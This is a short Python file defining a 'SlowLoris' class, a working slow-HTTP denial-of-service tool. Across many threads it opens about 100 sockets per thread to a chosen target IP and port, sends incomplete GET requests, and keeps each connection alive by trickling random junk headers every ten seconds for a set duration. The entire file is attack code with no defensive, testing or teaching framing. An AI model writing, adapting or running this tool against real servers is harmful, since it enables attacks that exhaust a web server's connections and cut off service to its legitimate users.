import socket
import random
import threading
import time

class SlowLoris:
    def __init__(self):
        self.packet_count = 0
    
    def launch(self, target_ip, target_port, duration, threads):
        def flood():
            sockets = []
            for _ in range(100):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((target_ip, target_port))
                    sock.send(f"GET /{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                    sock.send(f"Host: {target_ip}\r\n".encode())
                    sockets.append(sock)
                    self.packet_count += 1
                except:
                    pass
            
            end_time = time.time() + duration
            while time.time() < end_time:
                for sock in sockets:
                    try:
                        sock.send(f"X-Header-{random.randint(0, 5000)}: {random.randint(1, 5000)}\r\n".encode())
                        self.packet_count += 1
                    except:
                        sockets.remove(sock)
                time.sleep(10)
        
        worker_threads = []
        for _ in range(threads):
            t = threading.Thread(target=flood)
            t.daemon = True
            t.start()
            worker_threads.append(t)
        
        for t in worker_threads:
            t.join(timeout=duration)
        
        return self.packet_count
